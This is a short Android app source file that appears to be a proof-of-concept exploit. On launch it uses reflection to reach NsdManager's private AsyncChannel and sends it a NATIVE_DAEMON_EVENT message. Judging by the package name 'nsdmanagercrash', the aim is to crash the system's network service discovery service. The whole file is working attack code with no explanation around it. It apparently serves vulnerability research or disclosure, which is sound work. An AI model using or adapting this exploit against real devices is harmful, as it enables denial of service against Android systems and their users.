/**
 Copyright (C) 2016 Laszlo Makk
 This project is licensed under the Apache 2.0 License
 */

package uk.ac.cam.cl.lm649.nsdmanagercrash;

import android.content.Context;
import android.net.nsd.NsdManager;
import android.net.nsd.NsdServiceInfo;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import com.android.internal.util.AsyncChannel;

import java.lang.reflect.Field;

public class MainActivity extends AppCompatActivity {

    protected NsdManager nsdManager;
    private static final String TAG = "NsdManagerCrash";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "Application started");

        nsdManager = (NsdManager) getSystemService(Context.NSD_SERVICE);

        Log.d(TAG, "calling magic()");
        magic();
        Log.d(TAG, "Finished hacks.");
    }

    private void magic(){
        try {
            Field f = nsdManager.getClass().getDeclaredField("mAsyncChannel");
            f.setAccessible(true);
            AsyncChannel mAsyncChannel = (AsyncChannel) f.get(nsdManager);
            Log.d(TAG, "calling mAsyncChannel.sendMessage()");
            mAsyncChannel.sendMessage(NsdManager.NATIVE_DAEMON_EVENT);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

}
